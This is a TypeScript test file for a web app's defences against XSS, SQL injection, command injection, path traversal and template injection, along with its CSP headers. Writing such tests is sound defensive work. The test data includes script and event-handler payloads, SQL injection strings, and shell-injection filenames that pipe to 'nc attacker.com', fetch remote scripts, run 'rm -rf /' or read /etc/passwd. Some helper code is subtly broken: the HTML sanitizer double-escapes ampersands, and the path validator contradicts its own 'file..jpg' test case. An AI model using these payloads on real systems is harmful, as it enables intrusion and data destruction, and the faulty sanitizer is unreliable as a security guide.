/**
 * XSS and Injection Prevention Tests
 * Tests for Cross-Site Scripting (XSS) and various injection attack prevention
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { setupMSW } from '../mocks/msw.setup';
import { securityTestData } from '../fixtures/test-data';

// Setup MSW for HTTP interception
setupMSW();

describe('XSS and Injection Prevention Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    
    // Clear any DOM modifications
    document.body.innerHTML = '';
    
    // Reset any global state
    if (typeof window !== 'undefined') {
      delete (window as any).testXSSExecuted;
      delete (window as any).maliciousScript;
    }
  });

  describe('XSS Prevention', () => {
    it('should sanitize script tags in descriptions', async () => {
      const maliciousDescription = '<script>window.testXSSExecuted = true; alert("XSS")</script>Beautiful sunset';
      
      const response = await fetch('/api/descriptions/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          imageUrl: 'https://example.com/test.jpg',
          apiKey: 'sk-valid1234567890abcdefghijklmnop',
          description: maliciousDescription
        })
      });

      const result = await response.json();
      
      if (response.ok) {
        // If processed, should be sanitized
        expect(result.description).not.toContain('<script>');
        expect(result.description).not.toContain('alert(');
        expect(result.description).toContain('Beautiful sunset');
      } else {
        // Or should be rejected
        expect(result.error).toMatch(/invalid|malicious|unsafe/i);
      }
      
      // XSS should not execute
      expect((window as any).testXSSExecuted).toBeUndefined();
    });

    it('should sanitize event handlers in HTML', () => {
      const maliciousInputs = [
        '<img src="x" onerror="window.testXSSExecuted = true">',
        '<div onclick="alert(\'XSS\')">Click me</div>',
        '<svg onload="window.maliciousScript = true">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="data:text/html,<script>alert(1)</script>"></object>'
      ];

      maliciousInputs.forEach(input => {
        // Test with a mock component that might render user content
        const TestComponent = () => {
          return <div dangerouslySetInnerHTML={{ __html: sanitizeHTML(input) }} />;
        };

        render(<TestComponent />);
        
        // Check that dangerous attributes are removed
        const element = screen.getByRole('generic', { hidden: true });
        expect(element.innerHTML).not.toMatch(/onerror|onclick|onload/i);
        expect(element.innerHTML).not.toContain('javascript:');
        
        // XSS should not execute
        expect((window as any).testXSSExecuted).toBeUndefined();
        expect((window as any).maliciousScript).toBeUndefined();
      });
    });

    it('should prevent DOM-based XSS through URL parameters', () => {
      // Mock URL with malicious parameters
      const mockLocation = {
        search: '?description=<script>window.testXSSExecuted = true</script>',
        href: 'https://example.com/?description=%3Cscript%3Ewindow.testXSSExecuted%20=%20true%3C/script%3E'
      };

      Object.defineProperty(window, 'location', {
        value: mockLocation,
        writable: true
      });

      // Component that might use URL parameters
      const URLParamComponent = () => {
        const params = new URLSearchParams(window.location.search);
        const description = params.get('description') || '';
        
        return (
          <div>
            <h1>Description: {sanitizeText(description)}</h1>
            <div data-testid="safe-content">{description}</div>
          </div>
        );
      };

      render(<URLParamComponent />);
      
      const content = screen.getByTestId('safe-content');
      expect(content.textContent).not.toContain('<script>');
      expect((window as any).testXSSExecuted).toBeUndefined();
    });

    it('should escape special characters in user input', () => {
      const specialChars = [
        { input: '<', expected: '&lt;' },
        { input: '>', expected: '&gt;' },
        { input: '"', expected: '&quot;' },
        { input: "'", expected: '&#x27;' },
        { input: '&', expected: '&amp;' }
      ];

      specialChars.forEach(({ input, expected }) => {
        const escaped = escapeHTML(input);
        expect(escaped).toBe(expected);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should prevent SQL injection in search queries', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (name) VALUES ('hacker'); --",
        "' OR EXISTS(SELECT * FROM users) --"
      ];

      for (const maliciousQuery of sqlInjectionAttempts) {
        const response = await fetch('/api/images/search?' + new URLSearchParams({
          query: maliciousQuery
        }));

        // Should either sanitize or reject the query
        if (response.ok) {
          const result = await response.json();
          expect(result.images).toBeDefined();
          expect(Array.isArray(result.images)).toBe(true);
          
          // Query should be sanitized
          expect(JSON.stringify(result)).not.toContain('DROP TABLE');
          expect(JSON.stringify(result)).not.toContain('INSERT INTO');
        } else {
          expect(response.status).toBe(400);
          const errorData = await response.json();
          expect(errorData.error).toBeTruthy();
        }
      }
    });

    it('should use parameterized queries for database operations', () => {
      // Mock a database query function
      const mockDB = {
        query: vi.fn()
      };

      const userService = new UserService(mockDB);
      const maliciousEmail = "test'; DROP TABLE users; --";

      userService.findUserByEmail(maliciousEmail);

      // Should use parameterized query
      expect(mockDB.query).toHaveBeenCalledWith(
        expect.stringMatching(/\$\d+|\?/), // Parameterized query pattern
        expect.arrayContaining([maliciousEmail])
      );
    });
  });

  describe('Command Injection Prevention', () => {
    it('should prevent command injection in image processing', async () => {
      const commandInjectionAttempts = [
        'image.jpg; rm -rf /',
        'image.jpg && cat /etc/passwd',
        'image.jpg | nc attacker.com 4444',
        'image.jpg; wget http://malicious.com/script.sh',
        '$(curl http://attacker.com)'
      ];

      for (const maliciousFilename of commandInjectionAttempts) {
        const response = await fetch('/api/descriptions/generate', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            imageUrl: `https://example.com/${encodeURIComponent(maliciousFilename)}`,
            apiKey: 'sk-valid1234567890abcdefghijklmnop'
          })
        });

        // Should validate and reject malicious filenames
        if (!response.ok) {
          expect(response.status).toBe(400);
          const errorData = await response.json();
          expect(errorData.error).toMatch(/invalid|unsafe|malicious/i);
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should prevent directory traversal attacks', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '../../config/database.yml',
        '../../../.env'
      ];

      for (const maliciousPath of pathTraversalAttempts) {
        const response = await fetch('/api/files/upload', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            filename: maliciousPath,
            apiKey: 'sk-valid1234567890abcdefghijklmnop'
          })
        });

        // Should reject path traversal attempts
        expect(response.status).toBe(400);
        const errorData = await response.json();
        expect(errorData.error).toMatch(/invalid.*path|unsafe.*filename/i);
      }
    });

    it('should validate and sanitize file paths', () => {
      const testCases = [
        { input: 'normal-file.jpg', shouldPass: true },
        { input: '../../../etc/passwd', shouldPass: false },
        { input: '/absolute/path/file.jpg', shouldPass: false },
        { input: 'file with spaces.jpg', shouldPass: true },
        { input: 'file..jpg', shouldPass: true },
        { input: '..hidden-file', shouldPass: false }
      ];

      testCases.forEach(({ input, shouldPass }) => {
        const isValid = validateFilePath(input);
        expect(isValid).toBe(shouldPass);
      });
    });
  });

  describe('Template Injection Prevention', () => {
    it('should prevent template injection in dynamic content', () => {
      const templateInjectionAttempts = [
        '${7*7}',
        '#{7*7}',
        '{{7*7}}',
        '{%import os%}{%os.system("ls")%}',
        '<%= system("ls") %>',
        '{{constructor.constructor("alert(1)")()}}'
      ];

      templateInjectionAttempts.forEach(injection => {
        const result = processTemplate('Description: {{userInput}}', { userInput: injection });
        
        // Should not execute template code
        expect(result).not.toBe('Description: 49'); // 7*7 should not be evaluated
        expect(result).toContain(injection); // Should be treated as literal text
      });
    });
  });

  describe('Content Security Policy (CSP) Validation', () => {
    it('should set appropriate CSP headers', async () => {
      const response = await fetch('/api/descriptions/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          imageUrl: 'https://example.com/test.jpg',
          apiKey: 'sk-valid1234567890abcdefghijklmnop'
        })
      });

      const cspHeader = response.headers.get('Content-Security-Policy');
      expect(cspHeader).toBeTruthy();
      
      // Should restrict script sources
      expect(cspHeader).toMatch(/script-src[^;]*'self'/);
      expect(cspHeader).not.toMatch(/script-src[^;]*'unsafe-eval'/);
      expect(cspHeader).not.toMatch(/script-src[^;]*'unsafe-inline'/);
      
      // Should restrict object sources
      expect(cspHeader).toMatch(/object-src[^;]*'none'/);
    });

    it('should prevent inline script execution via CSP', () => {
      // Mock CSP violation reporting
      const cspViolations: any[] = [];
      
      // Override console.warn to catch CSP violations
      const originalWarn = console.warn;
      console.warn = vi.fn((message: string) => {
        if (message.includes('CSP') || message.includes('Content Security Policy')) {
          cspViolations.push(message);
        }
        originalWarn(message);
      });

      // Try to execute inline script (should be blocked by CSP)
      const script = document.createElement('script');
      script.innerHTML = 'window.testInlineScript = true;';
      document.head.appendChild(script);

      // CSP should prevent execution
      expect((window as any).testInlineScript).toBeUndefined();

      console.warn = originalWarn;
    });
  });
});

// Helper functions for testing (would normally be in utility modules)
function sanitizeHTML(input: string): string {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/&/g, '&amp;')
    .replace(/javascript:/gi, '')
    .replace(/on\w+=/gi, '');
}

function sanitizeText(input: string): string {
  return input.replace(/[<>"'&]/g, (match) => {
    const entities: { [key: string]: string } = {
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#x27;',
      '&': '&amp;'
    };
    return entities[match];
  });
}

function escapeHTML(input: string): string {
  const entities: { [key: string]: string } = {
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '&': '&amp;'
  };
  
  return input.replace(/[<>"'&]/g, (match) => entities[match]);
}

function validateFilePath(path: string): boolean {
  // Reject paths with traversal attempts
  if (path.includes('..') || path.startsWith('/') || path.includes('\\')) {
    return false;
  }
  
  // Only allow alphanumeric, hyphens, underscores, dots, and spaces
  return /^[a-zA-Z0-9._\s-]+$/.test(path);
}

function processTemplate(template: string, data: any): string {
  // Safe template processing that doesn't execute code
  return template.replace(/\{\{(\w+)\}\}/g, (match, key) => {
    return data[key] || match;
  });
}

// Mock service class for testing
class UserService {
  constructor(private db: any) {}
  
  findUserByEmail(email: string) {
    // Use parameterized query to prevent SQL injection
    return this.db.query('SELECT * FROM users WHERE email = $1', [email]);
  }
}